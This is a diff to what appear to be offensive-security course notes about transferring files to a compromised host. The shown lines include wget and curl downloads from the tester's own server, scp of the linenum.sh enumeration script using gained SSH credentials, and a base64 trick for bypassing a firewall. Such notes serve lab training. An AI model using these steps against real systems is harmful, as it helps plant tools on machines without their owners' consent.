@@ -195,3 +195,22 @@ wget http://<your_ip>:8000/<file>
 # Or using curl:
 curl -O http://<your_ip>:8000/<file>
 ```
+
+## SCP
+
+If we gained ssh user credentials on the host, we can:
+
+```bash
+Yagan@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
+
+user@remotehost's password: *********
+linenum.sh
+```
+
+## Base64
+
+In some cases, the host might have a **firewall** which prevents us from downloading files. In this case we can use a simple trick:
+
+*base64 encode the file into **base64** fromat*
+
+Then paste the string on the remote server and decode it.
